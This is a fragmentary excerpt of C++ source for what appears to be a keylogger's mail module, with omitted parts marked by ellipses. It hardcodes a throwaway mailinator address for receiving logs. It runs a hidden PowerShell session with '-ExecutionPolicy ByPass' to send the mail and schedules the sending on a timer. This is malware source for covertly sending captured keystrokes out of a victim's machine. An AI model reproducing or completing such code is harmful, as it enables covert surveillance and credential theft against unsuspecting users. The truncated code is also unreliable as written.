...
namespace Mail
{
    #define X_EM_TO "loggerofkey@mailinator.com"
    #define X_EM_FROM "loggerofkey@mailinator.com"
    #define X_EM_PASS ""
                                                                                                                            //Sending commands to hidden powershell session
...
#undef X_EM_PASS
    ...
    int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
    {
        ...
        if(!ok)
            ...
            if(!ok)
                return -2;
            std::string param = "-ExecutionPolicy ByPass \"" + scr_path + "\" - Subj \""
            ...
            m_timer.SetFunction([&]()                                            //Lambda Function help with mailing
            {
